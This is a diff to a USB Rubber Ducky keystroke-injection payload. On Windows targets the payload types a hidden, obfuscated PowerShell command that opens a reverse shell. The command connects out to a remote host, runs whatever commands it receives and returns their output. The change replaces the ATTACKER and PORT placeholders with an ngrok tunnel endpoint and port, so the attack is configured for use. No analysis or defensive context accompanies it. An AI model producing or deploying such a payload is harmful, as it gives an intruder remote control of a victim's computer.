@@ -60,7 +60,7 @@ IF ($_OS == WINDOWS) THEN
     DELAY WAIT
     STRINGLN powershell -NoP -NonI -w h
     DELAY WAIT
-    STRINGLN $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt( ATTACKER , PORT );$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oUt-STriNG);$x=$z+"Ducky@PS "+(pwd)+"> ";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE();exit
+    STRINGLN $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt( 2 tcp ngrok , 10318 );$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oUt-STriNG);$x=$z+"Ducky@PS "+(pwd)+"> ";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE();exit
 REM Capslock light will indicate a finished payload
     CAPSLOCK
 ELSE
@@ -69,3 +69,4 @@ REM Inserting the Ducky into a non Windows machine will result in ATTACKMODE OFF
 END_IF
 
  
+
